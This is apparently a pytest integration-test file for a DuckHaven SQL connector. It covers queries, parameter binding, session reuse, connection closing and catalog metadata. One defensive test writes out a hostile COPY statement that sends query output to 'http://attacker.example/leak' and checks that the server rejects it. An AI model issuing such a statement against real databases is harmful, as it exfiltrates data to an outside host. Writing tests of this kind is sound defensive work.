"""Live integration tests against a real DuckHaven with SQL sessions enabled.

Opt-in: skipped unless ``DUCKHAVEN_TEST_HOST``, ``DUCKHAVEN_TEST_WORKSPACE``, and
``DUCKHAVEN_TEST_PAT`` are set. Run with::

    make test-integration

The target server must have ``SQL_SESSIONS_ENABLED=true`` and the PAT's principal must be
a member of the workspace with at least one connected, compatible agent.
"""

import os

import pytest

from duckhaven_sql_connector import ProgrammingError, connect

pytestmark = pytest.mark.integration

HOST = os.environ.get("DUCKHAVEN_TEST_HOST")
WORKSPACE = os.environ.get("DUCKHAVEN_TEST_WORKSPACE")
TOKEN = os.environ.get("DUCKHAVEN_TEST_PAT")
AGENT = os.environ.get("DUCKHAVEN_TEST_AGENT") or None
CATALOG = os.environ.get("DUCKHAVEN_TEST_CATALOG") or None

if not (HOST and WORKSPACE and TOKEN):
    pytest.skip(
        "set DUCKHAVEN_TEST_HOST/WORKSPACE/PAT to run live integration tests",
        allow_module_level=True,
    )


@pytest.fixture
def conn():
    connection = connect(host=HOST, workspace=WORKSPACE, token=TOKEN, agent=AGENT, catalog=CATALOG)
    try:
        yield connection
    finally:
        connection.close()


def test_select_one(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1 AS one")
    rows = cur.fetchall()
    assert rows == [(1,)]
    assert cur.description[0][0] == "one"


def test_multi_statement_session_reuse(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1")
    assert cur.fetchall() == [(1,)]
    cur.execute("SELECT 2")
    assert cur.fetchall() == [(2,)]


def test_parameter_binding(conn):
    cur = conn.cursor()
    cur.execute("SELECT ? AS n, ? AS s", [7, "hi"])
    assert cur.fetchall() == [(7, "hi")]


def test_hostile_copy_is_rejected(conn):
    cur = conn.cursor()
    with pytest.raises(ProgrammingError):
        cur.execute("COPY (SELECT 1) TO 'http://attacker.example/leak'")


def test_statement_after_close_raises(conn):
    conn.close()
    with pytest.raises(ProgrammingError):
        conn.cursor()


def test_metadata_catalogs_and_tables(conn):
    cur = conn.cursor()
    cur.catalogs()
    catalogs = [row[0] for row in cur.fetchall()]
    assert isinstance(catalogs, list)  # at least the attached workspace catalogs

    cur.tables()
    assert cur.description is not None
    assert "table_name" in [col[0] for col in cur.description]
